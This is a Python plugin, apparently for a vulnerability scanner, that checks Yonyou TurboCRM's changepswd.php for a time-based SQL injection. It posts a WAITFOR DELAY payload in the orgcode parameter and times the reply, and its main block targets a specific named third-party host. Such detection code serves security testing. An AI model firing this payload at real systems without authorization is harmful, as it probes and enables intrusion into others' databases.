#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ 用友TruboCRM管理系统  /login/changepswd.php参数orgcode 时间注入漏洞
#references:http://www.wooyun.org/bugs/wooyun-2010-076114
import time

def assign(service, arg):
    if service == "yongyou_crm":
        return True, arg

def audit(arg):
    target =arg+ "login/changepswd.php?orgcode=1&loginname=system"
    data = 'submit=1&oldpassword=admin&password=admin&confirmpswd=admin&orgcode=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&loginname=system&key=-1'
    start = time.time()
    code, head,res, errcode, _   = curl.curl2(target)
    end1 = time.time()
    code, head,res, errcode, _   = curl.curl2(target,post=data)
    end2 = time.time()
    if  code ==  200  and  ((end2-end1)-(end1-start) >=4):
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_crm', 'http://crm7.cfldcn.com:8090/')[1])